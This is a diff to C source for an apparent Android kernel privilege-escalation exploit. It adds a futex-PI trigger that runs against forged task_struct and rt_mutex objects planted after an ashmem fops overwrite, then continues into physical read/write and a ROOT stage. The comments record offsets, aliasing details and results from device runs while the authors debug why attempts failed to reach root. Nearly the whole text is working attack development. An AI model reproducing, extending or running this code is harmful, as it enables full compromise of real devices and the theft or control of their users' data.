@@ -1,4 +1,13 @@
 #include "common.h"
+#ifdef FUTEX_POISON_PROBE
+/* Defined in fops.c: runs the v14 choreography with a poisoned payload. It now
+ * takes the physrw fd because it runs from inside run_p0_pipe_oracle_diagnostic(),
+ * i.e. after the forged objects exist. */
+int futex_poison_probe(int fd);
+#endif
+/* Also needed by the default-off live futex-PI route below, which compiles into
+ * every build, not just the poison one. */
+#include "futex_pi_v14.h"
 
 #if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
 uint32_t f_wait;
@@ -909,12 +918,122 @@ int run_exploit(int argc, char **argv) {
     return 1;
   }
   rmg_diag("PIN gate OK core=%d\n", sched_getcpu());
+#ifdef FUTEX_POISON_PROBE
+  /* POISON PROBE (build_f946b_poison.bat only).
+   *
+   * This used to call futex_poison_probe() directly here and return 3. That was
+   * structurally incapable of working: this point is BEFORE try_cfi_stage(), so
+   * the physrw fd did not exist yet, and nothing on this path had ever written
+   * the forged task_struct / rt_mutex_base. Every probe run therefore pointed
+   * the v14 choreography at uninitialised page memory and hung in
+   * sched_setattr without faulting. The probe now lives in
+   * run_p0_pipe_oracle_diagnostic(), immediately after the forge and while the
+   * fd is still live.
+   *
+   * We deliberately FALL THROUGH here so the CFI route reaches the p0 oracle
+   * diagnostic, which is where the probe now fires. The poison build also forces
+   * that route unconditionally in try_cfi_stage(), so no env var is needed. */
+  rmg_diag("POISON falling through to CFI route; probe runs inside the p0 "
+           "oracle route, after the forge\n");
+  pr_info("POISON app: probe relocated into the p0 oracle route (post-forge)\n");
+#endif
   for (int attempt = 1; attempt <= 1; attempt++) {
     rmg_diag("PIN about to trigger_fops_slide_route\n");
     int triggered = app_trigger_fops_slide_route();
     rmg_diag("PIN trigger returned triggered=%d\n", triggered);
     pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
             attempt, triggered);
+#if defined(APP_FOPS_REUSE_VERIFIED_PAGE) || defined(SLIDE_STACK_WRITER)
+    /* FUTEX-PI v14 live route. DEFAULT OFF; additive. Arm with FUTEX_TRIGGER=1.
+     *
+     * Placed HERE, immediately after app_trigger_fops_slide_route(), because that is
+     * the live app path and the only place the forged objects actually exist:
+     * select_slide_payload_index() -> populate_slide_payload() writes them into the
+     * reclaim page and publishes them through fake_task / fake_lock / fake_w0 (see
+     * the "app fops slide route ... lock=..." line just printed). It is deliberately
+     * NOT wired into run_p0_pipe_oracle_diagnostic(), which the app build never calls -
+     * a first attempt put it there and a real device run proved the block is dead code
+     * on this path (no FUTEX line in rmg-diag.log despite P0_ORACLE_DIAG=1 being set).
+     *
+     * Addresses come from the published globals, never recomputed from
+     * FAKE_TASK_OFF/W0_OFF: the live forge lays objects at SLIDE_BANK_TASK_OFF and
+     * SLIDE_BANK_LOCK_OFF, so page_base+FAKE_TASK_OFF names a different address.
+     */
+    if (getenv("FUTEX_TRIGGER")) {
+      struct futex_pi_v14_config cfg;
+      memset(&cfg, 0, sizeof(cfg));
+      if (!fake_task || !fake_lock || !fake_w0) {
+        rmg_diag("FUTEX refusing: forge globals unset task=%016zx lock=%016zx "
+                 "w0=%016zx\n", fake_task, fake_lock, fake_w0);
+        pr_error("futex: forge globals unset, refusing to trigger\n");
+        return 1;
+      }
+      cfg.page_base = page_base;
+      cfg.target_fops = data_addr(ASHMEM_MISC_FOPS);
+      cfg.fake_fops = fake_fops;
+      cfg.fake_lock = fake_lock;
+      cfg.fake_task = fake_task;
+      /* struct rb_node is 24 bytes, so the waiter's ->task field - the one
+       * rt_mutex_top_waiter() dereferences after rb_entry(..., tree_entry) - is at
+       * +0x18, which is where the fake task_struct's pi_tree_entry aliases. */
+      cfg.pi_waiters_self = fake_w0 + 0x18;
+      cfg.signal_scratch = page_base + SCRATCH_OFF;
+      rmg_diag("FUTEX cfg page=%016zx target_fops=%016zx fake_fops=%016zx "
+               "lock=%016zx task=%016zx self=%016zx scratch=%016zx\n",
+               cfg.page_base, cfg.target_fops, cfg.fake_fops, cfg.fake_lock,
+               cfg.fake_task, cfg.pi_waiters_self, cfg.signal_scratch);
+      pr_info("futex: cfg page=%016zx task=%016zx lock=%016zx self=%016zx\n",
+              cfg.page_base, cfg.fake_task, cfg.fake_lock, cfg.pi_waiters_self);
+      fflush(NULL);
+      int futex_triggered = futex_pi_v14_trigger(&cfg);
+      rmg_diag("FUTEX result triggered=%d step=%d name=%s handler=%d\n",
+               futex_triggered, futex_pi_v14_last_step(),
+               futex_pi_v14_step_name(futex_pi_v14_last_step()),
+               futex_pi_v14_handler_result());
+      pr_info("futex: triggered=%d step=%d (%s) handler=%d\n", futex_triggered,
+              futex_pi_v14_last_step(),
+              futex_pi_v14_step_name(futex_pi_v14_last_step()),
+              futex_pi_v14_handler_result());
+      fflush(NULL);
+      /* FUTEX_TRIGGER used to `return futex_triggered;` on the very next line,
+       * which made a FUTEX_TRIGGER run structurally incapable of rooting.
+       *
+       * `root_child_done` is written only by the ROOT stage (root.c:1319,
+       * :1789, :2458) and `cfi_stage_done` only inside try_cfi_stage()
+       * (fops.c:798, :954). main's epilogue is
+       *     exploit_ok = cfi_stage_done && root_child_done;
+       * so skipping try_cfi_stage() leaves cfi_stage_done == 0 forever and the
+       * physrw + ROOT machinery behind try_cfi_stage() never executes at all.
+       *
+       * Run 6 measured exactly that from the other side: the slide route had
+       * already put fake_fops into ashmem_misc.fops ("p0 physical write
+       * status=0 ok=1", "app fops stage=trigger-return attempt=1 triggered=1")
+       * and the v14 trigger completed for the first time
+       * ("futex: triggered=1 step=6 (done) handler=1"), yet the process exited
+       * status=0xff00 with not one CFI/PHYS/ROOT line in the whole log - the
+       * root stage had simply never been entered.
+       *
+       * The handler result is therefore reported, never promoted into
+       * root_child_done: a forged-signal-frame install is not root. Fall
+       * through to the same try_cfi_stage() the non-futex path uses. Its
+       * first precondition (fops.c:583, misc_fops == fake_fops) is already
+       * satisfied by the slide route that ran just above, so it proceeds to
+       * the pipe physrw and the ROOT stage. */
+      int futex_verified = futex_triggered && try_cfi_stage();
+      rmg_diag("FUTEX then cfi triggered=%d verified=%d handler=%d "
+               "cfi_step=%d cfi_errno=%d cfi_dirty=%d root_child_done=%d\n",
+               futex_triggered, futex_verified, futex_pi_v14_handler_result(),
+               cfi_last_step, cfi_last_errno, cfi_dirty_seen, root_child_done);
+      pr_info("app fops futex attempt=1 triggered=%d verified=%d step=%d "
+              "errno=%d\n",
+              attempt, futex_verified, cfi_last_step, cfi_last_errno);
+      fflush(NULL);
+      if (futex_verified || cfi_dirty_seen) {
+        break;
+      }
+      return futex_triggered ? 0 : 1;
+    }
+#endif
     int verified = triggered && try_cfi_stage();
     pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
             "step=%d errno=%d\n",
